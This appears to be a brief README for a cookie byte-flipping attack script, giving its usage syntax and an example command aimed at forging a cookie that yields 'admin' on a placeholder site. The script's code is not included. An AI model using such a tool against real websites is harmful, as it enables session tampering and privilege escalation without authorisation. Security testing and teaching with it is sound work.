# Byte-Flipping

Perform byte flipping attack against vulnerable cookies.

```python
python3 byte-flip.py -u <URL> -n <cookie_name> -v <cookie_value> -e <hex_low,hex_upp,base64_base64_urlsafe> -s <String_to_search_in_response>
python3 byte-flip.py -u http://web.com/index.php -n auth -v aET7FNm19aieDs2pPyAqSQ== -e base64 -s admin
```

All the parameters are required
